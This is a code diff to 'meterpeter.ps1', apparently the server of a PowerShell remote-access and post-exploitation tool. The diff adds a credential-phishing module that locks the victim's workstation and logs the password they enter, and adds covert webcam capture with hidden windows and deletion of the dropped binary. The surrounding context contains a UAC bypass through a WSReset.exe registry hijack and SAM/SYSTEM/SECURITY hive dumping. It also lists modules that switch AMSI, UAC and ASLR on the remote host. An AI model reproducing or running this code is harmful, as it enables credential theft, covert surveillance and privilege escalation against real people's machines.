@@ -848,7 +848,8 @@ While($Client.Connected)
       write-host "   GoogleX   Open Google Sphere(prank)       Open Remote Browser in google sphere";
       write-host "   LockPC    Lock Remote WorkStation         Lock Remote workstation (rundll32)";
       write-host "   SpeakPC   Make Remote-Host Speak          Input Frase for Remote-Host to Speak";
-      write-host "   AMSIset   Turn On/Off AMSI (reg)          Client:User OR Admin Priv Required";
+      write-host "   CredPhi   Promp User for logon creds      Client:User|Admin - Privs Required";
+      write-host "   AMSIset   Turn On/Off AMSI (reg)          Client:User|Admin - Privs Required";
       write-host "   UACSet    Turn On/Off remote UAC          Client:Admin - Privileges Required";
       write-host "   ASLRSet   Turn On/Off remote ASLR         Client:Admin - Privileges Required";
       write-host "   TaskMan   Turn On/off TaskManager         Client:Admin - Privileges Required";
@@ -882,7 +883,7 @@ While($Client.Connected)
           write-host " Elevate Client ($payload_name.ps1) Privileges." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
           Write-Host "   Status   Remote Path           Execution" -ForeGroundColor green;
           Write-Host "   ------   -----------           ---------";
-          Write-Host "   Created  `$env:tmp\WStore.vbs   $Input_Delay (sec)`n`n";
+          Write-Host "   Created  `$env:tmp\WStore.vbs   $Input_Delay (sec)`n`n"; 
           Write-Host "   [i] Exit|Start meterpeter.ps1 again (use same ip|port|obfuscation)" -ForeGroundColor yellow;
           Write-Host "   [i] to recive the elevated Connection back in $Input_Delay seconds." -ForeGroundColor yellow;Start-Sleep -Seconds 5;
           $Command = "echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\WStore.vbs;echo 'WScript.sleep $Delay_Time' `>`> `$env:tmp\WStore.vbs;echo 'objShell.Run `"cmd /R powershell Start-Process -FilePath C:\Windows\System32\WSReset.exe -WindowStyle Hidden`", 0, True' `>`> `$env:tmp\WStore.vbs;`$cmdline = `"cmd /R start powershell -exec bypass -w 1 -File `$env:tmp\Update-KB4524147.ps1`";`$CommandPath = `"HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command`";New-Item `$CommandPath -Force|Out-Null;New-ItemProperty -Path `$CommandPath -Name `"DelegateExecute`" -Value `"`" -Force|Out-Null;Set-ItemProperty -Path `$CommandPath -Name `"(default)`" -Value `$cmdline -Force -ErrorAction SilentlyContinue|Out-Null;cmd.exe /R start %tmp%\WStore.vbs";
@@ -1005,11 +1006,34 @@ While($Client.Connected)
         write-host "   trigger the AntiVirus (WindowsDefender) Amsi Detection";
         write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
         write-host "   -------   -----------                     ------";
-        write-host "   Device    List WebCam Devices             Client:User  -  Privileges required";
-        write-host "   Snap      Take WebCam Screenshot          Client:User|Admin  - Privs required";
+        write-host "   Device    List Camera Devices             Client:User  -  Privileges required";
+        write-host "   Snap      Auto use of default cam         Client:User|Admin  - Privs required";
+        write-host "   Manual    Manual sellect device cam       Client:User|Admin  - Privs required";
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Post:Cam> " -NoNewline -ForeGroundColor Green;
         $Cam_choise = Read-Host;
+        If($Cam_choise -eq "Device" -or $Cam_choise -eq "device")
+        {
+          $name = "CommandCam.exe";
+          $File = "$Bin$name"
+          If(([System.IO.File]::Exists("$File")))
+          {
+            $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
+            $FileBytes = "($FileBytes)";
+            $File = $File.Split('\')[-1];
+            $File = $File.Split('/')[-1];
+            $Command = "`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R %tmp%\CommandCam.exe /devlist|findstr /C:`"Device name:`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R del /Q /F %tmp%\CommandCam.exe}";
+            $Command = $Command -replace "#","$File";
+            $Command = $Command -replace "@","$FileBytes";
+            $Upload = $True;
+            $Cam_set = "True";
+          } Else {
+            Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
+            Write-Host "   ------   ---------";
+            Write-Host "   Failed   File Missing: $File" -ForeGroundColor red;
+            $Command = $Null;
+          }
+        }
         If($Cam_choise -eq "Snap" -or $Cam_choise -eq "snap")
         {
           $name = "CommandCam.exe";
@@ -1033,21 +1057,23 @@ While($Client.Connected)
             $Command = $Null;
           }
         }
-        If($Cam_choise -eq "Device" -or $Cam_choise -eq "device")
+        If($Cam_choise -eq "Manual" -or $Cam_choise -eq "manual")
         {
           $name = "CommandCam.exe";
           $File = "$Bin$name"
+          write-host " - Input Device Name to Use: " -NoNewline;
+          $deviceName = Read-Host;
           If(([System.IO.File]::Exists("$File")))
           {
             $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
             $FileBytes = "($FileBytes)";
             $File = $File.Split('\')[-1];
             $File = $File.Split('/')[-1];
-            $Command = "`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R %tmp%\CommandCam.exe /devlist|findstr /C:`"Device name:`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R del /Q /F %tmp%\CommandCam.exe}";
+            $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";powershell -version 2 Start-Process -FilePath `$env:tmp\CommandCam.exe /devname `"$deviceName`" /quiet -WindowStyle Hidden;Start-Sleep -Seconds 3;cmd /R del /Q /F %tmp%\CommandCam.exe}}else{`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R start /min %tmp%\CommandCam.exe /devname `"$deviceName`" /quiet;cmd /R del /Q /F %tmp%\CommandCam.exe}}}else{`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R start /min %tmp%\CommandCam.exe /devname `"$deviceName`" /quiet;cmd /R del /Q /F %tmp%\CommandCam.exe}}";            
             $Command = $Command -replace "#","$File";
             $Command = $Command -replace "@","$FileBytes";
+            $Camflop = "True";
             $Upload = $True;
-            $Cam_set = "True";
           } Else {
             Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
             Write-Host "   ------   ---------";
@@ -1402,6 +1428,62 @@ While($Client.Connected)
         write-host " [sam|system|security] Remote Dump Directory: '`$env:tmp'" -ForeGroundColor yellow;write-host "`n`n";Start-Sleep -Seconds 2;
         $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){cmd /R reg save hklm\system system;cmd /R reg save hklm\sam sam;cmd /R reg save hklm\security security;dir `$env:tmp `> `$env:localappdata\dellog.txt;Get-content `$env:localappdata\dellog.txt;Remove-Item `$env:localappdata\dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";       
       }
+      If($choise -eq "CredPhi" -or $choise -eq "Creds")
+      {
+        write-host "`n   Requirements" -ForegroundColor Yellow;
+        write-host "   ------------";
+        write-host "   This Module will allow attacker to Lock Target WorkStation and request";
+        write-host "   a valid UserAccount password to UnLock it, While in background it stores ";
+        write-host "   the credentials to a remote logfile under `$env:tmp folder for later review.";
+        write-host "`n`n   Modules     Description                  Remark" -ForegroundColor green;
+        write-host "   -------     -----------                  ------";
+        write-host "   exploit     Phish for remote creds       Client:User|Admin - Privs required";
+        write-host "   ReadLog     Read phishing logFile        Client:User  - Privileges required";
+        write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
+        write-host "`n`n :meterpeter:Post:Creds> " -NoNewline -ForeGroundColor Green;
+        $cred_choise = Read-Host;
+        If($cred_choise -eq "Exploit" -or $cred_choise -eq "exploit")
+        {
+          $name = "CredsPhish.ps1";
+          $File = "$Bin$name"
+          $timestamp = Get-date -DisplayHint Time;
+          write-host " Phishing for Remote Credentials (logon)" -ForegroundColor Blue -BackgroundColor White;
+          write-host " [$timestamp] Waiting for valid credentials ✔" -ForegroundColor Yellow;Start-Sleep -Seconds 2;
+          If(([System.IO.File]::Exists("$File")))
+          {
+            ## Write Local script (CredsPhish.ps1) to Remote-Host $env:tmp
+            $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
+            $FileBytes = "($FileBytes)";
+            $File = $File.Split('\')[-1];
+            $File = $File.Split('/')[-1];
+            ## Use powershell -version 2 in VBS trigger IF available
+            $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"};echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\CredsPhish.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -version 2 -Exec Bypass -Win 1 -File %tmp%\CredsPhish.ps1`", 0, True' `>`> `$env:tmp\CredsPhish.vbs;remove-Item test.log -Force;cmd /R %tmp%\CredsPhish.vbs}else{`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"};echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\CredsPhish.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -Exec Bypass -Win 1 -File %tmp%\CredsPhish.ps1`", 0, True' `>`> `$env:tmp\CredsPhish.vbs;remove-Item test.log -Force;cmd /R %tmp%\CredsPhish.vbs}}else{`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"};echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\CredsPhish.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -Exec Bypass -Win 1 -File %tmp%\CredsPhish.ps1`", 0, True' `>`> `$env:tmp\CredsPhish.vbs;cmd /R %tmp%\CredsPhish.vbs}";
+            $Command = $Command -replace "#","$File";
+            $Command = $Command -replace "@","$FileBytes";
+            $Upload = $True;
+            $Phishing = $True;
+          }else{
+            ## Local File { CredsPhish.ps1 } not found .
+            Write-Host "`n`n   Status     Local Path" -ForeGroundColor green;
+            Write-Host "   ------     ----------";
+            Write-Host "   Not Found  $File" -ForeGroundColor red;
+            $File = $Null;
+            $Command = $Null;
+            $Upload = $False;
+          }
+        }
+        If($cred_choise -eq "ReadLog" -or $cred_choise -eq "ReadLog")
+        {
+          write-host " Read Remote-Host Credential LogFile" -ForeGroundColor blue -BackGroundColor white;Start-Sleep -Seconds 1;write-host "`n";
+          $Command = "If(([System.IO.File]::Exists(`"`$env:tmp\CredsPhish.log`"))){Get-Content `$env:tmp\CredsPhish.log `> rtf.txt;Get-Content rtf.txt;Remove-Item rtf.txt -Force;Remove-Item `$env:tmp\CredsPhish.ps1 -Force;Remove-Item `$env:tmp\CredsPhish.log -Force;Remove-Item `$env:tmp\CredsPhish.vbs -Force}else{echo `"   [i] Not Found: `$env:tmp\CredsPhish.log`" `> rtf.txt;Get-Content rtf.txt;Remove-Item rtf.txt -Force;Remove-Item `$env:tmp\CredsPhish.ps1 -Force;Remove-Item `$env:tmp\CredsPhish.log -Force;Remove-Item `$env:tmp\CredsPhish.vbs -Force}";
+        }
+        If($cred_choise -eq "Return" -or $cred_choise -eq "return" -or $cred_choise -eq "cls" -or $cred_choise -eq "Modules" -or $cred_choise -eq "modules" -or $cred_choise -eq "clear")
+        {
+          $choise = $Null;
+          $Command = $Null;
+        }
+        $cred_choise = $Null;
+      }
       If($choise -eq "Return" -or $choice -eq "return" -or $choise -eq "cls" -or $choise -eq "Modules" -or $choise -eq "modules" -or $choise -eq "clear")
       {
         $choise = $Null;
@@ -1671,6 +1753,12 @@ While($Client.Connected)
           {
             write-host "   image    `$env:tmp\image.bmp" -ForeGroundColor yellow;Start-Sleep -Seconds 1;
             $Camflop = "False";
+          }
+          If($Phishing  -eq "True")
+          {
+            $OutPut = $OutPut -replace ".ps1",".log";
+            write-host "   output   $OutPut";
+            $Phishing = "False";
           }
           $Command = $Null;
         } Else {
